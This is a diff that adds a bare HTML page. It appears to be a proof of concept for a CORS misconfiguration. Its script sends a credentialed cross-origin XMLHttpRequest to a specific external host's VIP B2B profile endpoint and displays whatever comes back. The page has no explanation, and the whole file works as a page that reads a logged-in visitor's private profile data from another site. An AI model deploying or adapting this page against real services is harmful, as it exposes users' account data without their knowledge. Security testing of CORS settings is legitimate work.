@@ -1,0 +1,56 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+
+  <title></title>
+   
+
+
+
+</head>
+<body >
+   
+    <div id="content">
+		
+		
+	</div>
+	
+	
+	<script>
+var CROSObject = null;
+if(typeof(XMLHttpRequest) != "undefined")
+{
+    CROSObject = new XMLHttpRequest();
+    CROSObject.withCredentials = true;
+}
+else if(typeof(XDomainRequest) != "undefined")
+{
+    CROSObject = new XDomainRequest();
+}
+else
+{
+    CROSObject = null;
+}
+
+if(CROSObject != null)
+{
+
+    CROSObject.open("GET", "http://portbilet2.gridnine.com/vip-b2b/common/profile");
+
+    CROSObject.onload = function() {
+		//alert(CROSObject.responseText);
+	  let cont = document.getElementById("content");
+		cont.innerText = CROSObject.responseText;
+	};
+    CROSObject.onerror = function() {alert("There was an error")};
+
+    CROSObject.send();
+}
+
+
+	</script>	
+
+</body>
+</html>	
